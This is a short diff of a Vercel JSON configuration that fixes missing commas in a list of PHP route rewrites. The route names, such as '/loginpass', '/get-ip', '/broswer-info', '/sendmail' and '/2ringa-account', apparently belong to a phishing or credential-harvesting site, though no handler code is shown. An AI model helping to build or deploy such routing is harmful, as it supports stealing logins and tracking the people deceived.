@@ -3,17 +3,14 @@
     "api/*.php": {
       "runtime": "vercel-php@0.6.0"
     }
+  },
   "rewrites": [
     { "source": "/", "destination": "/api/index.php" },
     { "source": "/email", "destination": "/api/email.php" },
     { "source": "/sendmail", "destination": "/api/sendmail.php" },
-    { "source": "/loginpass", "destination": "/api/loginpass.php" }
-    { "source": "/get-ip", "destination": "/api/get-ip.php" }
-    { "source": "/broswer-info", "destination": "/api/broswer-info.php" }
+    { "source": "/loginpass", "destination": "/api/loginpass.php" },
+    { "source": "/get-ip", "destination": "/api/get-ip.php" },
+    { "source": "/broswer-info", "destination": "/api/broswer-info.php" },
     { "source": "/2ringa-account", "destination": "/api/2ringa-account.php" }
   ]
 }
-
-
-
-
